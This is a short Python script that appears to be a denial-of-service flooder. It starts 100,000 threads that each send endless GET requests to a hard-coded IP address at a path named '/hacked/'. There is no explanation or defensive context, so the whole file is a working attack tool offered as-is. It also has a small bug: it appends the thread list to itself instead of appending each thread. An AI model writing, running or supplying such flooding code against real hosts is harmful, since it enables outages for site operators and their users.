import threading
import requests

target_url = "http://100.91.209.65/hacked/"

def send_requests():
    while True:
        try:
            response = requests.get(target_url)
            print(f"request sent: {response.status_code}")

        except Exception as e:
            print(f"Error: {e}")
num_threads = 100000
threads = []

for i in range(num_threads):
    thread = threading.Thread(target=send_requests)
    thread.start()
    threads.append(threads)



